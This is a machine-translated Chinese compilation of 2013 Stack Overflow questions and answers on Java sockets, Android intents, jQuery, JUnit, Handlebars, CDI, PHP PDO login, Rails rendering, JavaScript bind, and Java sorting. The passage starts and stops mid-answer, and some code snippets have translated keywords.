使用 BufferedReader 和 PrintWriter 对我来说适用于所有版本，并且对于通过任何通信协议发送和接收任何你想要的东西（甚至是 JSON 字符串）都非常方便。在启动后台线程时尝试将它们保存为成员变量，如下所示：

```
mInput = new BufferedReader(new InputStreamReader(
            socket.getInputStream()));
mOutput = new PrintWriter(new BufferedWriter(
            new OutputStreamWriter(socket.getOutputStream())), true); 
```

对于异步通信，您的后台线程可能如下所示：

```
@Override
public final void run() {
    while (!Thread.currentThread().isInterrupted()) {
        if (mInput == null) {
            break;
        }
        String message = null;
        try {
            message = mInput.readLine();
        } catch (IOException e) {
            // handle the exception as you like
            break;
        }
        if (Thread.currentThread().isInterrupted()) {
            // thread was interrupted while reading
            break;
        } else if (message != null) {
            // handle the message as you like
        }
    }
} 
```

使用另一个后台线程发送消息：

```
@Override
public void run() {
    if (mOutput != null) {
        mOutput.println(<message to be );
        if (mOutput == null) {
            // the above thread was interrupted while writing
        } else if (!mOutput.checkError()) {
            // everything went fine
        } else {
            // handle the exception
        }
    }
} 
```

此外，您必须**从外部关闭流**以确保 readLine 不会永远阻塞：

```
try {
    mOutput.close();
    mInput.close();
    mOutput = null;
    mInput = null;
} catch (IOException e) {
    // log the exception
} 
```

现在，由于您使用的是 TCP 套接字，因此可能会发生套接字实际上已死且 readLine 仍处于阻塞状态的情况。您必须像上面一样检测到并关闭流。为此，您必须添加另一个定期发送保持活动消息的线程（哦，好吧）。如果 X 秒内没有从远程设备接收到消息，它必须关闭流。

这整个方法确保套接字关闭并且所有线程在任何情况下都完成。当然，如果您需要，您可以通过删除发送者线程并在阅读器线程中包含 println() 来使通信同步。我希望对您有所帮助（即使答案晚了 8 个月）。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2013-09-12T08:15:44.287

您应该使用 Apache Commons IO：[http ://commons.apache.org/proper/commons-io/](http://commons.apache.org/proper/commons-io/)

请参阅`IOUtils.copy()` [http://commons.apache.org/proper/commons-io/javadocs/api-release/index.html?org/apache/commons/io/package-summary.html](http://commons.apache.org/proper/commons-io/javadocs/api-release/index.html?org/apache/commons/io/package-summary.html)

# android-intent - 从非活动类的实例启动活动

> ID：15154116
> 
> 赞同：0
> 
> 时间：2013-03-01T09:10:31.510
> 
> 标签：android-intent, android-activity

我有两个活动类：**QuestionActivity**和**ReportCard**。我有一个不同的非活动类 SummationClass.class。这个 Summation 类在 QuestionActivity 的 onCreate() 上调用。

```
SummationClass s=newSummationClass(100,400,textViewProblem,buttonOptionOne,buttonOptionTwo,buttonOptionThree, buttonOptionFour,buttonSolve);
s.summationFunction(); 
```

这个 summationFunction() 是一个公共的 void 方法，它只是在 QuestionActivity 布局文件中加载一些 Button 值和 TextView 值。

现在我想从 summationFunction() 中的循环终止开始活动 ReportCard；我在这里遇到的问题是在 summationClass() 方法中创建 Intent 时的访问说明符问题。

```
 Intent intent=new Intent(QuestionActivity.this,ReportCard.class); 
```

错误是：“**在此范围内无法访问 QuestionActivity 类型的封闭实例**”

如何为实例设置适当的上下文以启动 ReportCard 活动？任何帮助是极大的赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:13:16.820

您可以在运行函数之前将 Context 传递给 SummationClass，也可以调用

```
getApplicationContext();
or
getBaseContext(); 
```

# android - 发生异常后如何保持测试运行？

> ID：15154117
> 
> 赞同：0
> 
> 时间：2013-03-01T09:10:38.273
> 
> 标签：android, testing, robotium

假设我有 10 个测试用例，并且`Exception`发生在其中的第二个上。在它发生之后，其余的测试将不会开始。发生后如何继续运行测试`Exception`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T11:19:07.973

**在 catch 块中添加其他测试用例。**
假设异常将在第二个测试用例中发生，那么您可以在该 catch 块中添加剩余的测试用例。
有时我们需要在获取异常或缓存异常后使用一些功能。
您可以为此使用 Catch 块。

```
try{  
 testcase1  
 testcase2  
 .  
 .  
 .  
 .  
 testcase10  
}    
catch(Exception e)  
{  
   if(testcase1.isExecute()||blaa || blaa)
   {
      //you have something to check here which testcases have exception or which testcase is executed
     run  your rest of test cases.
   testcase7
   .
   .
   testcase10
} 
```

此代码可能对您有所帮助。这只是逻辑，你需要做的实现..

# javascript - jQuery 在点击时切换 HTML

> ID：15154122
> 
> 赞同：6
> 
> 时间：2013-03-01T09:10:53.903
> 
> 标签：javascript, jquery

当我单击按钮时，HTML 会发生变化，但是当我再次单击时，幻灯片切换会启动，但我想将 html 放回为 Show Me。

```
<div id="show">Show Me</div>
<div id="visible">Hello, My name is John.</div>

$(document).ready(function(){
    $("#show").click(function(){
        $('#visible').slideToggle();
        $('#show').html('Hide me');
    });
}) 
```

[http://jsfiddle.net/u2p48/13/](http://jsfiddle.net/u2p48/13/)

知道这是怎么做的吗？

谢谢

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-03-01T09:13:26.503

您可以使用条件运算符`? :`在文本之间切换。

**[现场演示](http://jsfiddle.net/u2p48/14/)**

```
$(document).ready(function(){
    $("#show").click(function(){
        $('#visible').slideToggle();            
        $('#show').html($('#show').text() == 'Hide me' ? 'Show Me' : 'Hide me');
    });
}) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T09:13:48.333

您需要通过`'Show me'`或`'Hide me'`到`.html`，具体取决于您是显示还是隐藏。一种方法是检查`#visible`滑动前的可见性：

```
var on = $('#visible').is(':visible'); 
```

因此：

```
$('#show').html(on ? 'Show me' : 'Hide me'); 
```

[演示](http://jsfiddle.net/L7wQP/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:18:23.027

也看看这个解决方案：

```
$("#show").click(function(){
    if ($('#visible').hasClass('visible')) {
        $('#visible').slideDown().removeClass('visible');
        $('#show').html('Hide me');
    } else {
        $('#visible').slideUp().addClass('visible');
        $('#show').html('Show Me');
    }    
}); 
```

[http://jsfiddle.net/xkyf2/1/](http://jsfiddle.net/xkyf2/1/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-03-10T18:51:07.653

在您的 html 中使用数据属性

```
 $('button').on('click', function(){
		var that = $('button');
		if(that.text() == that.data("text-swap")){
			that.text(that.data("text-original"));
		} else {
			that.data("text-original", that.text());
		that.text(that.data("text-swap"));
		}	
	});
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<button data-text-swap="Replace Text" data-text-original="Original Text">Original Text</button>
```

# java - 测试中的 if 语句

> ID：15154125
> 
> 赞同：10
> 
> 时间：2013-03-01T09:11:13.827
> 
> 标签：java, unit-testing

我有一个带有大量单元测试的参数化测试类，这些单元测试通常控制自定义电子邮件的创建。现在班级有很多测试取决于参数化班级中使用的因素，每个测试的测试流程都是相同的。一个测试的例子：

```
@Test
public void testRecipientsCount() {
    assertEquals(3, recipientsCount);
} 
```

我必须在我的电子邮件类中添加额外的功能，将一些额外的内部电子邮件添加到收件人列表中，而这只发生在某些情况下，这会导致我的问题。

假设我想断言创建的消息数量。对于旧测试，每种情况都相同，但现在根据情况不同。对我来说最直观的方法是添加 if 语句：

```
@Test
public void testRecipientsCount(){
    if(something) {
        assertEquals(3, recipientsCount);
    }
    else {
        assertEquals(4, recipientsCount);
    }
}
... 
```

但我更有经验的同事说我们应该避免在测试课程中使用 ifs（我有点同意这一点）。

我认为对两个测试类进行拆分测试可能会起作用，但这会导致两个类中的代码冗余（我仍然必须检查是否创建了非内部消息、它们的大小、内容等），并添加了几行其中之一。

我的问题是：我该怎么做才能不使用 if 或大量冗余代码（不使用参数化类会产生更多冗余代码）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T09:15:43.220

在我看来，Junit 应该像协议一样阅读。这意味着您可以编写冗余代码以使测试用例更具可读性。为业务逻辑中每个可能的 if 语句以及否定用例编写一个测试用例。这是获得 100% 测试覆盖率的唯一方法。我使用的结构：

```
- testdata preparation
- executing logic
- check results
- clear data 
```

此外，您应该在自己的抽象类中编写大对象的复杂断言：

```
abstract class YourBusinessObjectAssert{
  public static void assertYourBussinessObjectIsValid(YourBusinessObject pYourBusinessObject,       Collection<YourBusinessObject> pAllYourBusinessObject) {
for (YourBusinessObject lYourBusinessObject : pAllYourBusinessObject) {
  if (lYourBusinessObject.isTechnicalEqual(pYourBusinessObject)) {
    return;
  }
}
assertFalse("Could not find requested YourBusinessObject in List<YourBusinessObject>!", true);
}
} 
```

它将降低代码的复杂性，并且您可以将其提供给其他开发人员。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:29:17.867

在我看来，单元测试应该尽可能只测试一件事。因此，我会说，如果您需要一个 if 语句，那么您可能需要多个单元测试 - if/else 代码中的每个块都需要一个单元测试。

如果可能的话，我会说测试应该读起来像一个故事——我喜欢的布局（这不是我的想法:-)——它被广泛使用）是：

```
- given:  do setup etc
- when:  the place you actually execute/call the thing under test
- expect: verify the result 
```

单元测试只测试一件事的另一个优点是，当失败发生时，它的原因是明确的——如果你有一个很长的测试，有很多可能的结果，那么推理测试失败的原因就变得更加困难。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-02T00:47:24.043

我不确定是否有可能在参数化测试中干净利落地做你想做的事情。如果您需要基于某些功能的哪个参数的不同测试用例行为，您最好单独测试这些功能 - 在未参数化的不同测试类中。

如果您确实想将所有内容保留在参数化测试类中，我会倾向于制作一个辅助函数，以便您的示例测试至少读作一个简单的断言：

```
@Test
public void testRecipientsCount(){
    assertEquals(expectedCount(something), recipientsCount)
}

private int expectedCount(boolean which) {
    if (something){
       return 3;
    }
    else {
       return 4;
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T09:55:05.323

为什么不使用私有方法来测试每种方法的共同点？类似于（但可能带有该方法的一些输入参数`testCommonStuff()`）：

```
@Test
public void testRecipientsCountA(){
   testCommonStuff();
   // Assert stuff for test A
}

@Test
public void testRecipientsCountB(){
   testCommonStuff();
   // Assert stuff for test B
}

private void testCommonStuff() {
   // Assert common stuff
} 
```

这样你就不会得到多余的代码，你可以把你的测试分成更小的测试。如果他们实际上应该测试相同的东西，那么你也可以让你的测试更不容易出错。您仍然会知道哪个测试失败了，因此可追溯性应该没有问题。

# javascript - 为什么 jQuery.data() 带有 Raphael svg 路径的错误？

> ID：15154126
> 
> 赞同：3
> 
> 时间：2013-03-01T09:11:16.533
> 
> 标签：javascript, jquery, html, raphael

我对[jQuery .data()](http://api.jquery.com/data/#data-html5)和[Raphael 的 SVG path()](http://raphaeljs.com/reference.html#Paper.path)有疑问。

我写了一个[小例子](http://jsfiddle.net/NFQRH/)来解释。

```
paper = Raphael(0, 0, 600, 600)
polygon = paper.path('M19,20L24,83L106,62L112,23Z')
polygon.data('test', 'I need this info later!')
polygon.attr({"fill":"orange"})

$(document).on('click', onClick)

function onClick() {
    console.log('click')
    if(event.target.nodeName === 'path') {
        // how do i get data('test') ?

        // console.log(this.data('test')) // Uncaught TypeError: Object #<HTMLDocument> has no method 'data' 
        console.log($(this).data('test')) // undefined
        // console.log(event.target.data('test')) // Uncaught TypeError: Object #<SVGPathElement> has no method 'data' 
        console.log($(event.target).data('test')) // undefined

        // But jquery.remove() does work?
        $(event.target).remove()

    }
} 
```

如您所见，我制作了一个多边形，用颜色填充它，并在文档中添加了一个事件侦听器。每次单击时，我都会检查目标。如果这是一个多边形，我想获取它的数据。

请注意，在我的真实代码中，我生成了大量这样的多边形。所以一个简单的`polygon.data()`不会有帮助。我唯一的解决方案是使用 event.target 作为参考。 [多个多边形的示例](http://jsfiddle.net/NFQRH/1/)

如何接收数据值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T14:26:52.223

你很接近，你只需要包装在 jquery 对象中的节点首先设置数据：

```
$(polygon.node).data('test', 'I need this info later!'); 
```

我更新了您的[jsfiddle](http://jsfiddle.net/NFQRH/2/)以显示它可以正常工作。

# meteor - 如何在 #each 帮助程序块中使用 #if 帮助程序

> ID：15154134
> 
> 赞同：0
> 
> 时间：2013-03-01T09:11:31.610
> 
> 标签：meteor

我在使用#each 和#if helper 时遇到问题。首先我在[http://handlebarsjs.com/block_helpers.html](http://handlebarsjs.com/block_helpers.html,but)中寻找解决方案，但我什么也没找到。例如：有对象：

```
{
人们：
 [{
    名称：“A”，
    年龄：16，
    性别：“男孩”
  },{
    名称：“B”，
    年龄：14，
    性别：“男孩”
  },{
    名称：“C”，
    年龄：18，
    性别：“男孩”
 }]
};
```

在 html 中（伪代码，我想要，但我不知道如何完成它们。）

```
    {{#每个民族}}
            {{#如果年龄等于 16}}
                {{name}}可以开车
            {{/如果}}
            {{#如果年龄小于 16}}
                {{name}}不能开车
            {{/如果}}
            {{#如果年龄大于 16}}
                {{name}} 可以做任何事
            {{/如果}}
    {{/每个}}

```

或者

```
    {{#每个民族}}
            {{#if 相等(name,"A")}}
                {{name}}可以开车
            {{/如果}}
            {{#如果相等（名称，“B”）}
                {{name}}不能开车
            {{/如果}}
            {{#if 相等(name,"c")}}
                {{name}} 可以做任何事
            {{/如果}}
    {{/每个}}

```

感谢您的输入。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:46:25.820

您需要使用自定义表达式助手。

```
Handlebars.registerHelper('getDriveStatus', function(age, name) {
  if (age == 16) {
    return name + " can drive"
  }

  if (age < 16) {
    return name + " can't drive";
  }

  if (age > 16) {
    return name + " can't do anything";
  }
}); 
```

进而，

```
{{#each peoples}}
        {{getDriveStatus age name}}
{{/each}} 
```

字符条件也是如此。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T10:25:28.750

您可以在 Template.YourTemplate.helpers({}) 部分中创建一个辅助函数：

```
 Template.YourTemplate.helpers({
        'canDrive' : function(name, age){
        if (age == 16) { return name + " can drive" }
            if (age < 16) { return name + " can't drive"; }
            if (age > 16) { return name + " can't do anything"; }
     },
    }) 
```

在您的模板中，您可以像这样使用它：

```
 {{#each peoples}}
        {{canDrive name age}}
    {{/each}} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-02T05:21:04.633

谢谢@Prashant 和@Oscar，我得到了问题的解决方案。他们的回复很有帮助。如果您有同样的问题，请尝试做他们。并且有没有 Handlebars.registerHelper 的解决方案：

在 html 中：

```

       {{#每个民族}}
            {{#if equal name "A"}}{{age}}{{sex}}{{/if}}
       {{/每个}}

```

在客户端：

```

    Template.test.equal = 函数 (a,b) {
      返回 a===b;
    };

```

# javascript - 三星智能电视 JavaScript 应用程序安全性

> ID：15154139
> 
> 赞同：0
> 
> 时间：2013-03-01T09:11:50.967
> 
> 标签：javascript, security, console, samsung-smart-tv

尝试了很多搜索，到目前为止没有运气。也许有人对此有想法，将不胜感激。将 javascript/html 应用程序部署到电视 (SAMSUNG) 时，代码是否以某种方式编译？用户可以爬入代码并更改它吗？（就像使用 google chrome 调试器一样）。我需要某种形式的客户端安全/验证，但我是新手，不确定它是否安全。此致。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:18:54.033

> 代码是否以某种方式编译？

JavaScript 是一种运行时脚本语言。它不需要编译。

> 用户可以爬入代码并更改它吗？

显然有可用的 JS 控制台，用户可以使用它们来设置断点或使用这些控制台在它们上运行 JS 命令。看：

*   [http://forums.boxee.tv/showthread.php?t=47754](http://forums.boxee.tv/showthread.php?t=47754)
*   [http://www.samsungdforum.com/Guide/art00111/index.html](http://www.samsungdforum.com/Guide/art00111/index.html)
*   [http://jsconsole.com/remote-debugging.html](http://jsconsole.com/remote-debugging.html)

也许您可能想开始另一个问题来讨论您的应用程序并询问可能的安全选项。

# jax-rs - CDI 注入未在 jax-rs 控制器的基类中完成

> ID：15154141
> 
> 赞同：2
> 
> 时间：2013-03-01T09:12:03.790
> 
> 标签：jax-rs, jboss7.x, cdi, jboss-weld

我正在为 CDI 和类继承而苦苦挣扎。我有一个 JAX-RS 控制器声明为：

```
@Path("/share")
public class ControllerShare extends BaseController {
    @Inject
    private ServiceShare serviceShare;

    @PostConstruct
    private void verifInit() throws ExceptionTechnique {
        log.warn("Checking CDI injection");
        if (serviceShare == null) {
            log.error("serviceAccount not initialized. Check your EJB configuration");
            throw new ExceptionTechnique("serviceShare not initialized. Check your EJB configuration.");
        }
    }
...
} 
```

此控制器扩展了声明为的基本控制器：

```
public abstract class BaseController {
    private Logger log = LoggerFactory.getLogger(ControllerShare.class);

    @Context protected HttpServletRequest request;
    @Inject private ControlerSession ctrlSession;

    public BaseController() {}

    @PostConstruct
    private void verifInit() throws ExceptionTechnique {
        log.warn("Checking CDI injection");
        if (ctrlSession == null) {
            log.error("controllerSession not initialized. Check your CDI configuration");
            throw new ExceptionTechnique("serviceAccount not initialized. Check your CDI configuration.");
        }
    }
...
} 
```

问题是在 ControllerShare 中正确完成了注入（我正确地看到了“检查 CDI 注入”），但在 BaseController 类中没有完成（ctrlSession 为空）。我尝试@Named 和其他组合但没有成功。注入只是在 ControllerShare 中完成，而不是在 BaseController 中完成。

**编辑：** 还有一件事：奇怪的是@Context 工作正常。我的请求已设置并且值正确。

感谢您的任何解释和解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:51:32.450

实际上，这应该根据

[http://docs.jboss.org/cdi/spec/1.0/html/inheritance.html](http://docs.jboss.org/cdi/spec/1.0/html/inheritance.html)

> 4.2\. 成员级元数据的继承
> 
> 假设类 X 由托管 bean 或会话 bean Y 的 bean 类直接或间接扩展。
> 
> *   如果 X 声明一个注入字段 x，则 Y 继承 x。

附带说明：`@PostConstruct`但是，如果您重新指定它，则不会继承。因此，在您的子类中，您的方法必须以不同的方式命名才能执行两个初始化程序。

> *   如果 X 声明了一个初始化器、非静态观察者、@PostConstruct 或 @PreDestroy 方法 x()，则 Y 继承 x() 当且仅当 Y 和任何作为 X 的子类和 Y 的超类的中间类都没有覆盖该方法时X（）。

# python - 如何通过 Suds 使用通过 https 公开 wsdl 和通过 http 提供服务的 web 服务

> ID：15154149
> 
> 赞同：0
> 
> 时间：2013-03-01T09:12:31.563
> 
> 标签：python, soap, suds

我有一个奇怪的情况要解决（恕我直言）

我必须使用一个通过 https 具有 wsdl 并通过 http 具有服务的 Web 服务。我如何才能在运行中（在 Suds 中）“切换”到仅用于服务的 http？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:00:11.683

您可以编写自定义传输，但在您的情况下，在本地下载 wsdl 要简单得多。

```
import requests
import suds    

r = requests.get(SERVICE_WSDL_HTTPS_URL)
with open('/tmp/service.wsdl', 'w') as file:
    file.write(r.text)
client = suds.client.Client('file:///tmp/service.wsdl', location=SERVICE_HTTP_URL) 
```

# php - PHP MySQL登录功能问题

> ID：15154152
> 
> 赞同：0
> 
> 时间：2013-03-01T09:12:45.617
> 
> 标签：php, ajax, pdo

我做了一个登录功能，但我得到一个内部服务器错误。我已经检查了功能，但我没有看到问题。

如果我使用这个：

```
function login($username, $password) {
    if (!isset($username) || !isset($password)) {
        return false;
    }
    if ($this->db->selectOne('r_users', array('username' => trim($username), 'password' => md5(trim($password))))) {
            $_SESSION['username'] = $_POST['username'];
            $_SESSION["ipaddr"] = $_SERVER["REMOTE_ADDR"];

        return true;
    } else {
        return false;
    }
} 
```

我可以登录网站

但我想扩展它以从数据库中获取更多信息以创建会话，所以我创建了这个：

```
function login($username, $password) {
    if (!isset($username) || !isset($password)) {
        return false;
    }
    if ($this->db->selectOne('r_users', array('username' => trim($username), 'password' => md5(trim($password))))) {
            $data = array();
            $ps = $this->db->prepare('SELECT * FROM `r_users` WHERE `username` = :username');
            $ps->bindParam(':username', $_POST['username'], PDO::PARAM_STR);
            $ps->execute();
            $result = $ps->fetchAll(PDO::FETCH_ASSOC);
            foreach($result as $row) {
                    $data[] = $row;
            }
            $_SESSION['username'] = $data['username'];
            $_SESSION["ipaddr"] = $_SERVER["REMOTE_ADDR"];

        return true;
    } else {
        return false;
    }
} 
```

但这给了我一个内部服务器错误（ 500 ），但我看不出问题出在哪里。有人有想法吗？

该站点建立在 smarty/slim 框架基础上，我通过 jquery/php 形式调用此函数

*更新：将 FROM 添加到查询中，请参阅解决方案 1

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T20:37:01.053

我发现了问题。

因为我没有看到任何错误，所以我发现在更改查询后（我错过了 Yogesh Suthar 所说的 FROM），我发现 fetch 选项无法正常工作。所以我将功能更改为：

```
function login($username, $password) {
    if (!isset($username) || !isset($password)) {
        return false;
    }
    if ($this->db->selectOne('r_users', array('username' => trim($username), 'password' => md5(trim($password))))) {
            $ps = $this->db->prepare('SELECT * FROM `r_users` WHERE `username` = :username');
            $ps->bindParam(':username', $_POST['username'], PDO::PARAM_STR);
            **$ps->setFetchMode(PDO::FETCH_ASSOC);**
            $ps->execute();
            **$data = $ps->fetch();**

            $_SESSION['username'] = $data['username'];
            $_SESSION["ipaddr"] = $_SERVER["REMOTE_ADDR"];

        return true;
    } else {
        return false;
    }
} 
```

我更改了两个突出显示的项目。

在此之后，登录功能运行良好。

谢谢你们帮助我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:14:33.900

你忘`from`了查询

```
$ps = $this->db->prepare('SELECT * FROM `r_users` WHERE `username` = :username');
                                   ^ here is problem 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:43:56.103

`internal server error ( 500 )`意思是“查看服务器错误日志”。
因此，您必须找到错误日志并阅读错误消息。

# ruby-on-rails - 我收到 DoublerenderError

> ID：15154156
> 
> 赞同：0
> 
> 时间：2013-03-01T09:12:53.197
> 
> 标签：ruby-on-rails, ruby

我的控制器中有以下代码，错误跟踪到这段代码的错误 DoubleRenderError。

```
 def build_list(query_string)    
    tasks = query_tasks(query_string)
    @schema2tasklist = schema2tasklist(tasks)
    respond_to do |format|
        format.html { render :file => "#{Rails.root}/app/views/tasks/list.html.erb" }
    end 
  end 
```

我很困惑将“和返回”语句放在哪里，以便一次只调用一个渲染。

我的 list.html.erb 也有一个渲染调用。我也试图从那里返回，但没有帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:27:23.457

当您尝试在方法内多次渲染或重定向时会发生此类错误，请检查以下内容

1）如果您`build_list`从另一种方法调用并且它也有重定向。

```
def another_method
    #code
    build_list(query_string) 
    redirect_to root_url
end 
```

2) 您的方法、query_tasks 和 schema2tasklist 是否在其中定义了重定向/渲染

# javascript - 在内部函数中使用“self = this”和 bind(this) 之间有显着区别吗？

> ID：15154157
> 
> 赞同：1
> 
> 时间：2013-03-01T09:12:54.943
> 
> 标签：javascript, performance

在 JavaScript 中，当使用作为回调的内部函数（例如 AJAX 调用）时，它们在自己的环境中运行（`this`是窗口对象），并且不知道`this`它们是在哪里编写的。我已经看到了两种解决方案：

*   使用`self`or `that`: (通过自动装箱`self`变量完成)

```
var Obj = function(){
    var a = 1;

    var subFunc = function(){
        var self = this;
        $.ajax({
            url: 'something.x',
            success: function(data){alert(self);}
        });
    }

    return {
        subtract : subFunc
    }
};

var o = new Obj();
o.substract(); 
```

*   使用`bind`命令：（我不确定这是如何完成的）

```
var Obj = function(){
    var a = 1;

    var subFunc = function(){
        $.ajax({
            url: 'something.x',
            success: function(data){alert(this);}.bind(this)
        });
    }

    return {
        subtract : subFunc
    }
};

var o = new Obj();
o.substract(); 
```

口译员实际开始口译时有什么区别？这对性能有什么影响？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:31:17.347

经验丰富的 JS 开发人员通常更喜欢 bind（至少在我工作过的地方）。

JavaScript 作用域一开始很难理解，因为在定义新函数时，闭包中不包含“this”。它可能会让你想放弃，只是创建一个新的局部变量来指向它，但如果你这样做，你会限制自己。

一旦您习惯了 bind 的优势，您就可以始终如一地使用该语言。

你用JS写了很多类吗？一旦习惯了绑定，您就会知道为什么在对象上调用函数与将该函数设置为局部变量然后调用它是不同的，因为您总是在考虑范围。你总是知道“this”来自哪里，因为你声明了它。

您还避免了声明和阅读重复的“self”和“that”变量而使代码库混乱的烦恼。

bind 的缺点是它通常不可用。但是为它编写一个 polyfill（或者只是在网上找到一个）是非常有教育意义的，然后你再也不用担心它了！

我怀疑这两种方式都会对性能产生影响。当然不是在典型的日常使用中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-11T18:18:22.740

一位朋友最近向我指出了使用`var self`vs的一个好处。`.bind()`

对于 exe：

```
function () {
  var self = this;

  $('selector').map(function () {
    this.attr('href');

    self.doThis();
  });
} 
```

这样您就可以使用两个`this`范围。我同意另一个答案，即它会使事情变得混乱，但我想它有它的位置。

继承人一个[基准](http://jsperf.com/bind-vs-self-bb) 几乎是零差异。再说一次，它是一个非常简单的测试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-30T04:49:19.100

如果您最终不使用绑定，我建议您使用`that`而不是`self`.

那是因为`self`是一个有效的全局变量 (in `window.self`)。我曾经为我的范围命名`self`，但有一天我忘记了这`var self = this`条线......这并不像你想象的那么容易调试。我现在使用`that`or `me`，或者更多时候不使用绑定。

# java - 为什么 Collections.sort 使用合并排序而不是快速排序？

> ID：15154158
> 
> 赞同：104
> 
> 时间：2013-03-01T09:12:55.620
> 
> 标签：java, sorting, collections

我们知道快速排序是最快的排序算法。

JDK6`collections.sort`使用归并排序算法而不是快速排序。但是 Arrays.sort 使用快速排序算法。

Collections.sort 使用合并排序而不是快速排序的原因是什么？

* * *

## 回答 #1

> 赞同：199
> 
> 时间：2013-03-01T09:20:11.600

极有可能来自 Josh Bloch [§](https://stackoverflow.com/revisions/15154287/2)：

> 我确实写了这些方法，所以我想我有资格回答。确实没有单一的最佳排序算法。与归并排序相比，快速排序有两个主要缺陷：
> 
> 1.  它不稳定（如 parsifal 所述）。
>     
>     
> 2.  它不*保证*n log n 性能；它可以在病理输入上降级为二次性能。
>     
>     
> 
> 稳定性对于原始类型来说不是问题，因为没有区别于（值）相等的身份概念。[对于 Bentely 和 McIlroy 的实现（或随后的Dual Pivot Quicksort](http://iaroslavski.narod.ru/quicksort/DualPivotQuicksort.pdf) ），二次行为的可能性被认为不是问题，这就是为什么这些 QuickSort 变体用于原始排序的原因。
> 
> 对任意对象进行排序时，稳定性很重要。例如，假设您有表示电子邮件消息的对象，您首先按日期对它们进行排序，然后按发件人排序。您希望它们在每个发件人中按日期排序，但只有在排序稳定时才会如此。这就是为什么我们选择提供一种稳定的排序（合并排序）来对对象引用进行排序。（从技术上讲，多个连续稳定排序会导致键的字典顺序与排序相反：最终排序确定最重要的子键。）
> 
> 无论输入是什么，合并排序都能*保证n log n（时间）性能，这是一个很好的附带好处。*当然有一个缺点：快速排序是一种“就地”排序：它只需要 log n 外部空间（以维护调用堆栈）。另一方面，合并、排序需要 O(n) 外部空间。如果输入数组几乎已排序，则 TimSort 变体（在 Java SE 6 中引入）需要更少的空间 (O(k))。

此外，[以下](http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6804124)是相关的：

> java.util.Arrays.sort 和（间接）java.util.Collections.sort 用于对对象引用进行排序的算法是“修改过的合并排序”（如果低子列表中的最高元素小于高子列表中的最低元素）。” 它是一种相当快速的稳定排序，可保证 O(n log n) 性能并需要 O(n) 额外空间。在当时（由 Joshua Bloch 于 1997 年编写），这是一个不错的选择，但今天我们可以做得更好。
> 
> 自 2003 年以来，Python 的列表排序使用了一种称为 timsort 的算法（以编写它的 Tim Peters 命名）。它是一种稳定的、自适应的、迭代的归并排序，当在部分排序的数组上运行时，它需要远少于 n log(n) 的比较，同时在随机数组上运行时提供与传统归并排序相当的性能。像所有适当的合并排序一样，timsort 是稳定的，并且在 O(n log n) 时间内运行（最坏情况）。在最坏的情况下，timsort 需要 n/2 个对象引用的临时存储空间；在最好的情况下，它只需要很小的固定空间。将此与当前实现进行对比，后者总是需要额外的空间来存储 n 个对象引用，并且仅在几乎排序的列表上优于 n log n。
> 
> Timsort 在此处详细描述：http: [//svn.python.org/projects/python/trunk/Objects/listsort.txt](http://svn.python.org/projects/python/trunk/Objects/listsort.txt)。
> 
> Tim Peters 的原始实现是用 C 语言编写的。Joshua Bloch 将其从 C 语言移植到 Java 中，并对最终代码进行了广泛的测试、基准测试和调整。生成的代码是 java.util.Arrays.sort 的直接替换。在高度有序的数据上，此代码的运行速度最高可达当前实现的 25 倍（在 HotSpot 服务器 VM 上）。在随机数据上，新旧实现的速度是相当的。对于非常短的列表，即使在随机数据上，新实现也比旧实现要快得多（因为它避免了不必要的数据复制）。

另外，请参阅[Java 7 是否对方法 Arrays.Sort 使用 Tim Sort？](https://stackoverflow.com/questions/4018332/is-java-7-using-tim-sort-for-the-method-arrays-sort).

没有单一的“最佳”选择。与许多其他事情一样，它是关于权衡的。

# java - 我可以比较 Java 中的 WeakReference 变量吗？

> ID：15154159
> 
> 赞同：6
> 
> 时间：2013-03-01T09:12:56.087
> 
> 标签：java, hashmap, weak-references

我有一个`HashMap<MyClass,ArrayList<WeakReference<MyObject>>>`变量。

尽管从哈希映射中清除了弱引用，但我也希望能够从哈希映射中手动删除“MyObject”。这是一个中央侦听器对象。

当我将项目添加到链接到主哈希映射键值的数组列表时，我使用`.add(new WeakReference<MyObject>(owner))`

当我想从外部位置删除“自我”时，我发送“所有者”作为参数，这是真实对象。那么我怎样才能从我的哈希图中手动删除这个对象呢？我可以使用从传入的所有者参数生成的新 WeakReference 进行查询吗？旧`"new WeakReference<MyObject>(owner)"`的和新的`"new WeakReference<MyObject>(owner)"`会平等吗？所以我可以将它从哈希图中删除。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-01T09:23:42.253

> 旧的“new WeakReference(owner)”和新的“new WeakReference(owner)”是否相等？

**不，他们不会平等。**两者都是不同的对象，并且`equals`方法在弱引用中没有被覆盖。所以它默认检查两个引用是否相等，它们是否不相等。

建议：

```
